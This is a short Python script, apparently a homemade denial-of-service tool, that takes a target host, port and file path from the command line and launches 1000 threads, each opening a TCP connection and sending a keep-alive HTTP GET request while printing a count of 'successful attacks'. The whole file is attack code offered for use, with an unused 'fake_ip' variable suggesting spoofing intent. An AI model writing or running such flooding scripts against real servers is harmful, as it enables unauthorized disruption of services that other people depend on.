import socket
import threading
import sys
import time

fake_ip = '131.229.41.201'

target = sys.argv[1]
port = sys.argv[2]
filename = sys.argv[3]


attack_num = 0

def dos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, int(port)))
            HTTPMessage = f"GET /{filename} HTTP/1.1\r\nHost: {target}:{port}\r\nConnection: keep-alive\r\n"
            bytes = str.encode(HTTPMessage)
            s.sendall(bytes)      
            
            s.close()
            
            global attack_num
            attack_num += 1
        
            print("Sucessful attack ", attack_num)
            
            break 
        except IOError as e:
            print("Something went wrong\n  ", attack_num, " ", e)
            s.close()
            break
        
for i in range(1000):
    thread = threading.Thread(target = dos_attack)
    thread.start()
    
sys.exit()
